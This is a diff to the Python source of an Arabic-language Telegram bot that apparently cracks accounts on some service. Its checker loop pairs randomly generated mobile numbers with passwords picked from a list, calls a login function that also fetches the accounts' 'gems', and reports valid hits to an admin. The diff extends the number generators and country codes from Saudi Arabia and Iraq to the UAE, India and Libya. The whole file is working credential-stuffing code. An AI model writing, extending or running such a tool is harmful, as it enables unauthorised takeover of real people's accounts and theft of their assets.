@@ -38,7 +38,7 @@ valid_count = 0
 wrong_count = 0
 error_count = 0
 scan_threads = 10  # عدد الثريدز الافتراضي لسرعة الفحص
-current_country = "SA"  # الدولة الافتراضية للفحص (SA: السعودية، IQ: العراق)
+current_country = "SA"  # الدولة الافتراضية للفحص
 
 # تخزين بيانات المشتركين وحالات الأدمن
 subscribers: Set[int] = set()
@@ -389,6 +389,7 @@ def _tg_text(data: Dict, mobile: str, password: str, profile: Optional[Dict] = N
     lines.append("By - @aboodriad")
     return "\n".join(lines)
 
+# === دوال توليد أرقام الدول المتاحة ===
 def generate_saudi_number() -> str:
     prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
     return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
@@ -397,13 +398,51 @@ def generate_iraqi_number() -> str:
     prefixes = ["770", "771", "772", "773", "774", "780", "781", "782", "783", "784", "785", "786", "787", "788", "789", "790", "750", "751"]
     return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
 
+def generate_uae_number() -> str:
+    prefixes = ["50", "52", "54", "55", "56", "58"]
+    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
+
+def generate_india_number() -> str:
+    prefixes = ["98", "99", "97", "96", "95", "94", "93", "92", "91", "90", "88", "87", "86", "81", "70", "73", "74", "75", "76", "77", "78", "79", "63"]
+    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(8))
+
+def generate_libya_number() -> str:
+    prefixes = ["91", "92", "94", "93", "95"]
+    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
+
 def generate_number(country: str) -> str:
     if country == "IQ":
         return generate_iraqi_number()
+    elif country == "AE":
+        return generate_uae_number()
+    elif country == "IN":
+        return generate_india_number()
+    elif country == "LY":
+        return generate_libya_number()
     else:
         return generate_saudi_number()
 
-# === دوال تليجرام وأزرار قسم التفعيلات ===
+def get_country_area_code(country: str) -> int:
+    codes = {
+        "SA": 966,
+        "IQ": 964,
+        "AE": 971,
+        "IN": 91,
+        "LY": 218
+    }
+    return codes.get(country, 966)
+
+def get_country_name_label(country: str) -> str:
+    labels = {
+        "SA": "السعودية 🇸🇦",
+        "IQ": "العراق 🇮🇶",
+        "AE": "الإمارات 🇦🇪",
+        "IN": "الهند 🇮🇳",
+        "LY": "ليبيا 🇱🇾"
+    }
+    return labels.get(country, "السعودية 🇸🇦")
+
+# === لوحات المفاتيح والأزرار ===
 
 def get_control_keyboard(running: bool):
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -426,6 +465,9 @@ def get_country_keyboard():
     markup.add(
         types.InlineKeyboardButton("🇸🇦 السعودية (Saudi Arabia)", callback_data="select_country_sa"),
         types.InlineKeyboardButton("🇮🇶 العراق (Iraq)", callback_data="select_country_iq"),
+        types.InlineKeyboardButton("🇦🇪 الإمارات (UAE)", callback_data="select_country_ae"),
+        types.InlineKeyboardButton("🇮🇳 الهند (India)", callback_data="select_country_in"),
+        types.InlineKeyboardButton("🇱🇾 ليبيا (Libya)", callback_data="select_country_ly"),
         types.InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_admin")
     )
     return markup
@@ -436,7 +478,7 @@ def admin_command(message):
         bot.reply_to(message, "❌ عذراً، هذا الأمر مخصص للمطور فقط.")
         return
     
-    country_label = "السعودية 🇸🇦" if current_country == "SA" else "العراق 🇮🇶"
+    country_label = get_country_name_label(current_country)
     text = (
         "🎛 <b>قسم التفعيلات (لوحة التحكم)</b>\n\n"
         f"حالة الفحص حالياً: <b>{'يعمل 🚀' if is_running else 'متوقف 🛑'}</b>\n"
@@ -468,9 +510,16 @@ def callback_handler(call):
             reply_markup=get_country_keyboard()
         )
 
-    elif call.data in ["select_country_sa", "select_country_iq"]:
-        current_country = "SA" if call.data == "select_country_sa" else "IQ"
-        country_name = "السعودية 🇸🇦" if current_country == "SA" else "العراق 🇮🇶"
+    elif call.data.startswith("select_country_"):
+        code_map = {
+            "select_country_sa": "SA",
+            "select_country_iq": "IQ",
+            "select_country_ae": "AE",
+            "select_country_in": "IN",
+            "select_country_ly": "LY"
+        }
+        current_country = code_map.get(call.data, "SA")
+        country_name = get_country_name_label(current_country)
 
         if is_running:
             bot.answer_callback_query(call.id, "⚠️ الفحص يعمل بالفعل!")
@@ -499,7 +548,7 @@ def callback_handler(call):
         )
 
     elif call.data == "back_to_admin":
-        country_label = "السعودية 🇸🇦" if current_country == "SA" else "العراق 🇮🇶"
+        country_label = get_country_name_label(current_country)
         text = (
             "🎛 <b>قسم التفعيلات (لوحة التحكم)</b>\n\n"
             f"حالة الفحص حالياً: <b>{'يعمل 🚀' if is_running else 'متوقف 🛑'}</b>\n"
@@ -525,7 +574,7 @@ def callback_handler(call):
 
         bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
         
-        country_label = "السعودية 🇸🇦" if current_country == "SA" else "العراق 🇮🇶"
+        country_label = get_country_name_label(current_country)
         main_text = (
             "🎛 <b>قسم التفعيلات (لوحة التحكم)</b>\n\n"
             "حالة الفحص حالياً: <b>متوقف 🛑</b>\n"
@@ -572,7 +621,6 @@ def callback_handler(call):
         bot.answer_callback_query(call.id)
         bot.send_message(call.message.chat.id, f"⚙️ السرعة الحالية: <code>{scan_threads}</code> ثريد.\n\nأرسل عدد الثريدز الجديد (رقم صحيح بين 1 و 100):", parse_mode="HTML")
 
-# معالج الردود النصية الخاصة بقسم التفعيلات والثريدز للأدمن
 @bot.message_handler(func=lambda message: message.from_user.id == ADMIN_ID and message.from_user.id in user_states)
 def handle_admin_input(message):
     global scan_threads
@@ -662,7 +710,7 @@ def run_checker_loop(chat_id, msg_id):
                 tried.add(mobile)
 
             password = random.choice(passwords)
-            area_code = 964 if current_country == "IQ" else 966
+            area_code = get_country_area_code(current_country)
             res = login(mobile, password, area_code=area_code, country=current_country, timeout=TIMEOUT, server=SERVER, fetch_gems=True)
 
             with stats_lock:
@@ -694,7 +742,7 @@ def run_checker_loop(chat_id, msg_id):
             if not is_running or stop_event.is_set():
                 break
                 
-            country_name = "السعودية 🇸🇦" if current_country == "SA" else "العراق 🇮🇶"
+            country_name = get_country_name_label(current_country)
             with stats_lock:
                 status_text = (
                     f"🚀 <b>جاري فحص حسابات دولة {country_name} الآن...</b>\n\n"
